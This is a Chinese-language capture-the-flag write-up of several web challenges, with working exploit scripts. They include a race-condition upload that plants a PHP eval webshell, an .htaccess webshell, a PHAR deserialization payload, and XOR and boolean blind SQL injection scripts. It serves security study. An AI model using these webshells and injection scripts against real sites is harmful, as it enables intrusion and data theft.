    <content type="html"><![CDATA[<p>我太菜了啊，赶紧刷题，比赛打不动了</p><a id="more"></a><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>知识点：</p><ul><li>tomcat基本知识</li><li>Javaweb基础知识</li></ul><p>进了点了一下help，发现有filename参数，题目说了是个Java题，所以直接读取WEB-INF/web.xml，一无所获，抓个包，一顿操作之后发现只有改成POST方法就可以了（不知道是什么原理，之后再看）</p><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><p>再加上之前乱测得时候爆出来得信息</p><p><img src= "/img/loading.gif" data-lazy-src="2.png"></p><p>所以我们可以顺理成章的去读flagcontroller</p><p><img src= "/img/loading.gif" data-lazy-src="3.png"></p><p>然后解码得到flag</p><p>顺带一提tomcat的服务端文件结构</p><blockquote><p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。<br>/WEB-INF/database.properties：数据库配置文件</p></blockquote><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>知识点：</p><ul><li>ThinkPHP方法特性</li><li>文件名爆破</li><li>条件竞争</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ThinkPHP的后端，而ThinkPHP的默认文件保存地址为：/home/index/upload</p><p>再来审计源码，这里从手册我们得知ThinkPHP的upload()在无参数的时候是批量上传的，整个<code>$_FILES</code>数组的文件都会上传保存，也就是说这里存在条件竞争漏洞，我们连续上传正常文件和shell文件，就可以成功上传。</p><p><img src= "/img/loading.gif" data-lazy-src="4.png"></p><p>多上传几次就发现，文件名相差不大且是递增的关系，所以爆破就可以得到shell文件的文件名</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f24e2b54-a89a-4f3b-bb50-2d09be5acfec.node3.buuoj.cn/&quot;</span></span><br><span class="line"></span><br><span class="line">path = url + <span class="string">&quot;/index.php/home/index/upload&quot;</span></span><br><span class="line">files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;a.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>), <span class="string">&quot;file1&quot;</span>:(<span class="string">&quot;b.php&quot;</span>, <span class="string">&#x27;&lt;?php eval($_GET[&quot;a&quot;]);&#x27;</span>)&#125;</span><br><span class="line">r = requests.post(path, files=files)</span><br><span class="line">t1 = r.text.split(<span class="string">&quot;/&quot;</span>)[<span class="number">-1</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">param=json.loads(r.content)</span><br><span class="line">print(param)</span><br><span class="line">t1 = int(t1, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">j = t1</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    path = url + <span class="string">&quot;/Public/Uploads/&quot;</span>+param[<span class="string">&#x27;url&#x27;</span>].split(<span class="string">&quot;/&quot;</span>)[<span class="number">-2</span>]+<span class="string">&quot;/%s.php&quot;</span> % hex(j)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(path,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">429</span>:<span class="comment">#规避过于频繁访问导致的429</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        print(path)</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(j, path, r.status_code)</span><br><span class="line">    j -= <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>知识点：</p><ul><li>PHP反序列化</li><li>字符逃逸</li><li>数组绕过</li></ul><p><a href="http://www.zip下到源码才发现是个经典题,之前就看过wp,直接打了/">www.zip下到源码才发现是个经典题，之前就看过WP，直接打了</a></p><p><img src= "/img/loading.gif" data-lazy-src="5.png"></p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>知识点：</p><ul><li>bypass</li><li>文件上传</li></ul><p>非常简单的一道题，上传.hatcess，然后JavaScript绕过PHP过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt;<span class="built_in">eval</span>($_POST[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-BabysqliV3-0"><a href="#GXYCTF2019-BabysqliV3-0" class="headerlink" title="[GXYCTF2019]BabysqliV3.0"></a>[GXYCTF2019]BabysqliV3.0</h2><ul><li>弱密码</li><li>PHP伪协议</li><li>PHAR反序列化</li></ul><p>这道题居然是个弱密码，我服了，然后进去有个伪协议的文件包含，搞下来upload.php</p><p><img src= "/img/loading.gif" data-lazy-src="6.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    ä¸ä¼ æä»¶</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸ä¼ &quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $sandbox = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5($_SESSION[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">        $ext = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">        @mkdir($sandbox, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $sandbox;</span><br><span class="line">        <span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (â²â½`ã)&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.$file[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $sandbox;</span><br><span class="line">        <span class="keyword">global</span> $ext;</span><br><span class="line">        <span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    $uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">    $uploader-&gt;upload($_FILES[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼&lt;br&gt;&quot;</span>.$uploader.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="预期解："><a href="#预期解：" class="headerlink" title="预期解："></a>预期解：</h4><p>phar反序列化，基操不多提</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Uploader();</span><br><span class="line">$a-&gt;cmd = <span class="string">&#x27;highlight_file(&quot;/var/www/html/flag.php&quot;);&#x27;</span>; </span><br><span class="line">$a-&gt;Filename = <span class="string">&#x27;xzl&#x27;</span>;</span><br><span class="line">$a-&gt;token = <span class="string">&#x27;GXYeddbfa94f75d985cb8537c9bb31ac22c&#x27;</span>;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;xzl.txt&quot;</span>, <span class="string">&quot;xzl&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="非预期解："><a href="#非预期解：" class="headerlink" title="非预期解："></a>非预期解：</h4><p>woc，正则里面直接来了个空格</p><p><img src= "/img/loading.gif" data-lazy-src="7.png"></p><p>这就等于啥都没过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload.php?name&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;shell.php</span><br></pre></td></tr></table></figure><p>所以就直接另name为<code>/var/www/html/uploads/shell.php</code>，然后上传个有shell的txt，就直接可以getshell了。</p><h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>这道题打开让算数学题，对着输入框一顿操作没什么结果，被迫写了个脚本算了一千道计算，然后打开官方解一看：woc????真就脚本题？？这样的？</p><p>下面是官方EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = session()</span><br><span class="line">a = s.get(<span class="string">&quot;http://172.21.4.12:10044/index.php&quot;</span>)</span><br><span class="line">pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text) </span><br><span class="line">c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">a = s.post(<span class="string">&quot;http://172.21.4.12:10044/index.php&quot;</span>, data = &#123;<span class="string">&quot;answer&quot;</span> : c&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text) </span><br><span class="line">    c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">    print(c)</span><br><span class="line">    a = s.post(<span class="string">&quot;http://172.21.4.12:10044/index.php&quot;</span>, data = &#123;<span class="string">&quot;answer&quot;</span> : c&#125;)</span><br><span class="line">print(a.text)</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>知识点：</p><ul><li>异或注入</li></ul><p>这道题就是单纯的异或注入，过滤了union等关键字，用<code>1^0</code>和<code>1^0</code>可以测出异或注入，然后就直接写脚本了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://727fb90e-dd6f-4270-8236-7baa965e3bca.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    mid = (low+high)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(i,mid)</span><br><span class="line">        req = requests.post(url,data=payload)</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low+high)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(chr(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + chr(mid)</span><br><span class="line">    print(result)</span><br><span class="line">print(<span class="string">&quot;flag: &quot;</span> ,result)</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>知识点:</p><ul><li>布尔盲注</li><li>短标签绕过</li></ul><p><code>/robots.txt</code>可以爆出<code>*.php.bak</code>可以得到<code>image.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure><p>显然可以注入，很简单，直接跑布尔盲注，测试payload：</p><blockquote><p>?id=\0’&amp;path= or 0%23</p><p>?id=\0’&amp;path= or 1%23</p></blockquote><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ee7cc8eb-94c4-4b42-917c-bcbb82882178.node3.buuoj.cn/image.php&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span 